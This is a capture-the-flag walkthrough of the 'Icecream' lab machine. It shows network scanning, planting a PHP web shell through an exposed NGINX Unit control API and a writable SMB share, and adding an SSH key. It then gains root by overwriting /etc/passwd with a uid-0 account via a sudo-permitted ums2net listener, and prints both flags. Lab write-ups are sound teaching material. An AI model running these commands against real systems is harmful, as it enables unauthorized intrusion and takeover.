# Icecream

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.80:22
Open 10.0.2.80:139
Open 10.0.2.80:445
Open 10.0.2.80:80
Open 10.0.2.80:9000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.80
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 68:94:ca:2f:f7:62:45:56:a4:67:84:59:1b:fe:e9:bc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOo0aMrFKUdos1+tMkValDaSFRx0lOy7VE4akDQlO9DGQDNT0aT5JCXm9jcgHk7mne7bxPG2jUBms8n2O1iQNyI=
|   256 3b:79:1a:21:81:af:75:c2:c1:2e:4e:f5:a3:9c:c9:e3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPDdtb0wbP+/g4yk5RfteqQ3ho372gC6QdawREJ+y9Eb
80/tcp   open  http        syn-ack nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 403 Forbidden
139/tcp  open  netbios-ssn syn-ack Samba smbd 4
445/tcp  open  netbios-ssn syn-ack Samba smbd 4
9000/tcp open  cslistener? syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Server: Unit/1.33.0
|     Date: Fri, 10 Oct 2025 16:25:46 GMT
|     Content-Type: application/json
|     Content-Length: 40
|     Connection: close
|     "error": "Value doesn't exist."
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Unit/1.33.0
|     Date: Fri, 10 Oct 2025 16:25:46 GMT
|     Content-Type: application/json
|     Content-Length: 1042
|     Connection: close
|     "certificates": {},
|     "js_modules": {},
|     "config": {
|     "listeners": {},
|     "routes": [],
|     "applications": {}
|     "status": {
|     "modules": {
|     "python": {
|     "version": "3.11.2",
|     "lib": "/usr/lib/unit/modules/python3.11.unit.so"
|     "php": {
|     "version": "8.2.18",
|     "lib": "/usr/lib/unit/modules/php.unit.so"
|     "perl": {
|     "version": "5.36.0",
|     "lib": "/usr/lib/unit/modules/perl.unit.so"
|     "ruby": {
|     "version": "3.1.2",
|     "lib": "/usr/lib/unit/modules/ruby.unit.so"
|     "java": {
|     "version": "17.0.11",
|     "lib": "/usr/lib/unit/modules/java17.unit.so"
|     "wasm": {
|     "version": "0.1",
|     "lib": "/usr/lib/unit/modules/wasm.unit.so"
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: Unit/1.33.0
|     Date: Fri, 10 Oct 2025 16:25:46 GMT
|     Content-Type: application/json
|     Content-Length: 35
|     Connection: close
|_    "error": "Invalid method."
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.95%I=7%D=10/10%Time=68E9338B%P=x86_64-alpine-linux-mus
SF:l%r(GetRequest,4A8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Unit/1\.33\.0\
SF:r\nDate:\x20Fri,\x2010\x20Oct\x202025\x2016:25:46\x20GMT\r\nContent-Typ
SF:e:\x20application/json\r\nContent-Length:\x201042\r\nConnection:\x20clo
SF:se\r\n\r\n{\r\n\t\"certificates\":\x20{},\r\n\t\"js_modules\":\x20{},\r
SF:\n\t\"config\":\x20{\r\n\t\t\"listeners\":\x20{},\r\n\t\t\"routes\":\x2
SF:0\[\],\r\n\t\t\"applications\":\x20{}\r\n\t},\r\n\r\n\t\"status\":\x20{
SF:\r\n\t\t\"modules\":\x20{\r\n\t\t\t\"python\":\x20{\r\n\t\t\t\t\"versio
SF:n\":\x20\"3\.11\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules/py
SF:thon3\.11\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"php\":\x20{\r\n\t\t\t\
SF:t\"version\":\x20\"8\.2\.18\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/m
SF:odules/php\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"perl\":\x20{\r\n\t\t\
SF:t\t\"version\":\x20\"5\.36\.0\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit
SF:/modules/perl\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"ruby\":\x20{\r\n\t
SF:\t\t\t\"version\":\x20\"3\.1\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/un
SF:it/modules/ruby\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"java\":\x20{\r\n
SF:\t\t\t\t\"version\":\x20\"17\.0\.11\",\r\n\t\t\t\t\"lib\":\x20\"/usr/li
SF:b/unit/modules/java17\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"wasm\":\x2
SF:0{\r\n\t\t\t\t\"version\":\x20\"0\.1\",\r\n\t\t\t\t\"lib\":\x20\"/usr/l
SF:ib/unit/modules/wasm\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t")%r(HTTPOption
SF:s,C7,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20Unit/1
SF:\.33\.0\r\nDate:\x20Fri,\x2010\x20Oct\x202025\x2016:25:46\x20GMT\r\nCon
SF:tent-Type:\x20application/json\r\nContent-Length:\x2035\r\nConnection:\
SF:x20close\r\n\r\n{\r\n\t\"error\":\x20\"Invalid\x20method\.\"\r\n}\r\n")
SF:%r(FourOhFourRequest,C3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nServer:\x2
SF:0Unit/1\.33\.0\r\nDate:\x20Fri,\x2010\x20Oct\x202025\x2016:25:46\x20GMT
SF:\r\nContent-Type:\x20application/json\r\nContent-Length:\x2040\r\nConne
SF:ction:\x20close\r\n\r\n{\r\n\t\"error\":\x20\"Value\x20doesn't\x20exist
SF:\.\"\r\n}\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-10T16:25:47
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 44020/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 37140/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49199/udp): CLEAN (Failed to receive data)
|   Check 4 (port 53937/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: ICECREAM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ICECREAM<00>         Flags: <unique><active>
|   ICECREAM<03>         Flags: <unique><active>
|   ICECREAM<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
```
:::

## SMB

We have anonymous access with READ and WRITE on Temporary Directory.
```bash
└─$ netexec smb 10.0.2.80 -u '' -p '' --shares
SMB         10.0.2.80       445    ICECREAM         [*] Unix - Samba (name:ICECREAM) (domain:ICECREAM) (signing:False) (SMBv1:False)
SMB         10.0.2.80       445    ICECREAM         [+] ICECREAM\:
SMB         10.0.2.80       445    ICECREAM         [*] Enumerated shares
SMB         10.0.2.80       445    ICECREAM         Share           Permissions     Remark
SMB         10.0.2.80       445    ICECREAM         -----           -----------     ------
SMB         10.0.2.80       445    ICECREAM         print$                          Printer Drivers
SMB         10.0.2.80       445    ICECREAM         icecream        READ,WRITE      tmp Folder
SMB         10.0.2.80       445    ICECREAM         IPC$                            IPC Service (Samba 4.17.12-Debian)
SMB         10.0.2.80       445    ICECREAM         nobody                          Home Directories
```

No files, but this is `/tmp` directory on linux.
```bash
└─$ impacket-smbclient ''/'':''@10.0.2.80
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use icecream
# ls
drw-rw-rw-          0  Fri Oct 10 12:43:42 2025 .
drw-rw-rw-          0  Sun Oct  6 06:06:38 2024 ..
drw-rw-rw-          0  Fri Oct 10 12:15:23 2025 systemd-private-da119e270724489ea0f0eddc74da20c2-systemd-timesyncd.service-UljUqN
drw-rw-rw-          0  Fri Oct 10 12:15:22 2025 .font-unix
drw-rw-rw-          0  Fri Oct 10 12:15:22 2025 .XIM-unix
drw-rw-rw-          0  Fri Oct 10 12:15:22 2025 .ICE-unix
drw-rw-rw-          0  Fri Oct 10 12:15:22 2025 .X11-unix
drw-rw-rw-          0  Fri Oct 10 12:15:26 2025 systemd-private-da119e270724489ea0f0eddc74da20c2-systemd-logind.service-ti6FRo
```

## HTTP (9000)

![writeup.png](/assets/pentest/hackmyvm/icecream/writeup.png)

Each json level is path as it seems.
```bash
└─$ feroxbuster -u http://icecream.hmv:9000/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 199,153
200      GET       61l       88w     1042c http://icecream.hmv:9000/
200      GET        1l        1w        4c http://icecream.hmv:9000/certificates
200      GET        5l        8w       62c http://icecream.hmv:9000/config
200      GET       51l       72w      862c http://icecream.hmv:9000/status
200      GET        1l        1w        4c http://icecream.hmv:9000/js_modules

└─$ curl http://10.0.2.80:9000/config
{
        "listeners": {},
        "routes": [],
        "applications": {}
}
```

The server is called `Unit`: [unit](https://github.com/nginx/unit)
```bash
└─$ curl http://10.0.2.80:9000/ -I
HTTP/1.1 405 Method Not Allowed
Server: Unit/1.33.0
Date: Fri, 10 Oct 2025 16:47:20 GMT
Content-Type: application/json
Content-Length: 35
Connection: close
```

### NGINX Unit

The instructions are in the repo so follow them. First upload the script using SMB.

```bash
└─$ curl -X PUT --json '{"helloworld":{"type":"php","root":"/tmp","index":"shell.php"}}' http://icecream.hmv:9000/config/applications
{
        "success": "Reconfiguration done."
}
└─$ curl -X PUT --json '{"0.0.0.0:4444":{"pass":"applications/helloworld"}}' http://icecream.hmv:9000/config/listeners
{
        "success": "Reconfiguration done."
}
└─$ nc -zv icecream.hmv 4444
icecream.hmv [10.0.2.80] 4444 (?) open
```

![writeup-1.png](/assets/pentest/hackmyvm/icecream/writeup-1.png)

## SSH

We are user `ice`, no password but we can use private keys and SSH to login.

```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir /home/ice/.ssh; echo '$(cat id_rsa.pub)' > /home/ice/.ssh/authorized_keys"
mkdir /home/ice/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGC6mKq8UM2fW2E6kF+gpWFi5OL+hPXgnj3zyll+h1cP woyag@kraken' > /home/ice/.ssh/authorized_keys
---
ice@icecream:/tmp# mkdir /home/ice/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGC6mKq8UM2fW2E6kF+gpWFi5OL+hPXgnj3zyll+h1cP woyag@kraken' > /home/ice/.ssh/authorized_keys
---
└─$ ssh -i id_rsa ice@icecream.hmv
ice@icecream:~$ id
uid=1000(ice) gid=1000(ice) grupos=1000(ice),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
```

### User.txt

```bash
ice@icecream:~$ cat user.txt
HMVaneraseroflove
```

## Privilege Escalation

```bash
ice@icecream:~$ sudo -l
Matching Defaults entries for ice on icecream:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ice may run the following commands on icecream:
    (ALL) NOPASSWD: /usr/sbin/ums2net
```

- [ums2net](https://github.com/grandpaul/ums2net)
- [https://gtfobins.github.io/gtfobins/dd](https://gtfobins.github.io/gtfobins/dd)

The `of` allows you to overwrite the files starting from position 0. If the file has `HelloWorld` and you write `Pwned` it will become `PwnedWorld`. By that logic I wanted to add new user, because I could read `/etc/passwd` and test before doing something so destructive. Other way would be to edit `/etc/sudoers`.
```bash
ice@icecream:/tmp$ cp /etc/passwd /home/ice/
ice@icecream:/tmp$ wc /etc/passwd
  25   34 1267 /etc/passwd
```

> Make sure to test before messing with `passwd` file, if you mess up you may never login again and brick the VM.

Port is also exposed from outside hence you can test from your machine.
```bash
# Dev
ice@icecream:~$ echo '4446 of=/tmp/test' | sudo /usr/sbin/ums2net -c /dev/stdin -d
ums2net[1418]: Totally write 4895 bytes to /tmp/test
---
└─$ echo "letmein:$(openssl passwd -6 'Password123$'):0:0:letmein:/root:/bin/bash"
letmein:$6$078gYaoI0bosXI.A$DYrlCWBoIx9EGi9Rc1bheicyjAEh6k.tl1Oe5wkGT0SADmyWVoCdpkCI9/2l0mGJQ8vX8FwWgJX7At3z3M76K0:0:0:letmein:/root:/bin/bash

└─$ python3 -c "print('#'*1268 + '\n' + '''$(cat /etc/passwd)''' + '\n' + 'letmein:\$6\$68rLb3WD.yrMPsIT\$oFSox5O4m6RWNo/dqVDtGlxmkiU6GYS5n86eC4A/V3XDMzj8iMTYBPSawopiulbi9m/5p2PjZKSyYjYNbwjgw/:0:0:letmein:/root:/bin/bash')" | nc icecream.hmv 4446 -q 0
```

For real deal we should use local passwd file, or copy it and mess from remote.
```bash
# Prod
ice@icecream:~$ echo '4446 of=/etc/passwd' | sudo /usr/sbin/ums2net -c /dev/stdin -d
ums2net[1428]: Totally write 2679 bytes to /etc/passwd

ice@icecream:/tmp$ python3 -c "print('#'*1268 + '\n' + '''$(cat /etc/passwd)''' + '\n' + 'letmein:\$6\$68rLb3WD.yrMPsIT\$oFSox5O4m6RWNo/dqVDtGlxmkiU6GYS5n86eC4A/V3XDMzj8iMTYBPSawopiulbi9m/5p2PjZKSyYjYNbwjgw/:0:0:letmein:/root:/bin/bash')" | nc 0 4446 -q 0
```

And we are root
```bash
ice@icecream:/tmp$ su - letmein
Contraseña:
root@icecream:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

Root usually doesn't have `~/.ssh` directory so I didn't even try to write SSH authorized keys, but it would have worked since directory exists.
```bash
root@icecream:~# find -ls
   913925      4 drwx------   4 root     root         4096 oct  6  2024 .
   913923      4 -rw-r--r--   1 root     root          161 jul  9  2019 ./.profile
   914274      0 lrwxrwxrwx   1 root     root            9 oct  6  2024 ./.bash_history -> /dev/null
   915444      4 -rw-r--r--   1 root     root           66 oct  6  2024 ./.selected_editor
   915446      4 -rw-------   1 root     root           15 oct  6  2024 ./root.txt
   913926      4 drwx------   2 root     root         4096 oct  6  2024 ./.ssh
   913994      4 -rw-r--r--   1 root     root          571 abr 10  2021 ./.bashrc
   914276      4 drwxr-xr-x   3 root     root         4096 oct  6  2024 ./.local
   914277      4 drwx------   3 root     root         4096 oct  6  2024 ./.local/share
   914278      4 drwx------   2 root     root         4096 oct  6  2024 ./.local/share/nano
```

### Root.txt

```bash
root@icecream:~# cat /root/root.txt
HMViminvisible
```